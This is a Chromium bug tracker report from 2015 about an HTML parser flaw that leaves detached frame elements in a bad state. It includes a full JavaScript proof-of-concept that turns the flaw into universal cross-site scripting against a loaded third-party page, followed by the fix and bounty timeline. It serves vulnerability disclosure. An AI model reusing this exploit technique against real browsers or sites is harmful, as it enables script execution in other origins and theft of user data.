# HTML parser may leave frame element in an incorrect state

| Field | Value |
|-------|-------|
| **Issue ID** | [40081368](https://issues.chromium.org/issues/40081368) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | se...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2015-02-07 |
| **Bounty** | $7,500.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36

Steps to reproduce the problem:

What is the expected behavior?

What went wrong?
When the HTML parser encounters misnested tags, it may perform the reparenting process
using |ContainerNode::parserRemoveChild| and |ContainerNode::parserAppendChild|. Unlike
|removeChild|, |parserRemoveChild| doesn't detach a frame element's content frame.
So if the new parent of a subtree, which contains a frame element, is not in the document
tree the reparenting process of the subtree leaves it in a state where the detached from
the document tree frame element still has the content frame.

An attacker can use turn this into a UXSS bug. The algorithm is:
1) Create a "magic" frame element described above.
2) Load the target page into the frame element.
3) Change its |src| attribute to a "javascript:" URI.
4) Force the HTML parser to insert the frame element into the document tree. This will
cause the code from the "javascript:" URI to be executed in the context of the target page
without prior access checks since there is no active JavaScript context.

Repro:
<body>
<script>
frame = document.body.appendChild(document.createElement("iframe"));
frame.contentWindow.eval("(" + function() {
	document.write("<b><p><script>(" + function() {
		body = document.body; //save the new parent of the subtree
		body.remove(); //and remove it from the document
		top.magicFrame =
			body.firstChild.firstChild.appendChild(document.createElement("iframe"));
		document.documentElement.appendChild(body.firstChild); //reattach the subtree 
	} + "())</scr" + "ipt></b></p>");
	} + "())");

setTimeout(function() {
magicFrame.contentWindow.location = "https://www.google.com/intl/en/ads/?fg=1";
magicFrame.onload = function() {
	magicFrame.onload = null;

	helper = document.body.appendChild(document.createElement("iframe"));

	setTimeout(function() {
		magicFrame.src = "javascript:alert(document.body.textContent)";

		helper.srcdoc = "<b><p><script>(" + function() {
			document.querySelector("b").firstChild.appendChild(
				top.magicFrame.parentElement.parentElement.parentElement
			);
		} + "())</sc" + "ript></b></p>";
	}, 1000);
};
}, 0);
</script>
</body>

The repro also causes a crash in |blink::RenderObject::container|. The debug info is attached.

Version:
Google Chrome 40.0.2214.111
Google Chrome 42.0.2298.0 canary

-----

I would like to remain anonymous for this report.

Did this work before? N/A 

Chrome version: 40.0.2214.111  Channel: stable
OS Version: 6.1 (Windows 7, Windows Server 2008 R2)
Flash Version: Shockwave Flash 16.0 r0

## Attachments

- [debug.txt](attachments/debug.txt) (text/plain, 7.5 KB)

## Timeline

### in...@chromium.org (2015-02-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-02-08)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5737578358636544

### js...@chromium.org (2015-02-08)

CC'ing abarth and eseidel because I don't know who else to ask about these sort of parser vulnerabilities.

### js...@chromium.org (2015-02-08)

Actually, lacking any better ideas I'm just assigning to abarth@. Not sure if you or Eric are still part-time owning this code, but I hope one of you can at least point me in the right direction.

### cl...@chromium.org (2015-02-08)

[Empty comment from Monorail migration]

### js...@chromium.org (2015-02-10)

oysteine@ - abarth@ suggested you might be a good person to look at this

### js...@chromium.org (2015-02-18)

[Empty comment from Monorail migration]

### oy...@chromium.org (2015-02-19)

This is further along in the parser process than I have any experience with; hopefully kouhei@ knows better.

### cl...@chromium.org (2015-02-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2015-02-20)

Hey youhei. sorry to nag, but this is a readily exploitable UXSS impacting all shipping versions of Chrome. From a security perspective that's one of our worst case scenarios, and if we don't see activity on it soon we'll have to upgrade it to a p0. So, could you take a look at this ASAP?

### ko...@chromium.org (2015-02-21)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-02-23)

Reprod the issue and understood the severity of the issue. I'm blocking all other tasks and working on a fix.

### ko...@chromium.org (2015-02-23)

jschuh: I couldn't repro the UXSS part, although crash is still a problem.

### ko...@chromium.org (2015-02-23)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-02-23)

Noticed that the XSS repros on stable, not trunk...

Looks like the recent parser scheduling changes to yield on </script> greatly reduced the chance of repro by making attach() faster.
However, the scheduling change didn't hit the stable so looks like the XSS is applicable only on M40.

WIP: https://codereview.chromium.org/948793003/ 

### ko...@chromium.org (2015-03-01)

[Empty comment from Monorail migration]

### am...@google.com (2015-03-03)

[Automated comment] There appears to be on-going work (i.e. bugroid changes), needs manual review.

### ko...@chromium.org (2015-03-04)

The commit wasn't to the bug added somehow, but the patch has stuck on trunk.
https://codereview.chromium.org/948793003/

Requesting merge to M41

### pe...@chromium.org (2015-03-05)

Removing M41 merge request for the moment.  Tim Willis will handle security merge requests to stable, if they are important enough, and at specific times.  Hold steady on this one.

+timwillis@

### ti...@google.com (2015-03-05)

Adding Merge-Rejected label for tracking

### cl...@chromium.org (2015-03-18)

kouhei@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-04-01)

kouhei@: Uh oh! This issue is still open and hasn't been updated in the last 28 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### js...@chromium.org (2015-04-01)

Marking this as fixed, since the change landed and will roll out in m42.

### ti...@google.com (2015-04-09)

[Empty comment from Monorail migration]

### ti...@google.com (2015-04-14)

Congratulations - $7500 for this report.

Notes from panel: Great quality report as always!

### ti...@google.com (2015-05-06)

[Empty comment from Monorail migration]

### ti...@google.com (2015-06-03)

Processing via our *new* e-payment system should only take a 7-10 days and the reward should be on its way to you. Thanks again for your help!

### dc...@chromium.org (2016-11-03)

[Empty comment from Monorail migration]

### dc...@chromium.org (2016-11-03)

[Empty comment from Monorail migration]

### mm...@chromium.org (2016-12-29)

[Empty comment from Monorail migration]

### in...@chromium.org (2017-02-08)

[Empty comment from Monorail migration]

### aa...@google.com (2017-02-08)

[Empty comment from Monorail migration]

### mm...@google.com (2017-05-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-03-14)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-03-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-03-15)

[Empty comment from Monorail migration]

### is...@google.com (2019-03-15)

This issue was migrated from crbug.com/chromium/456518?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081368)*
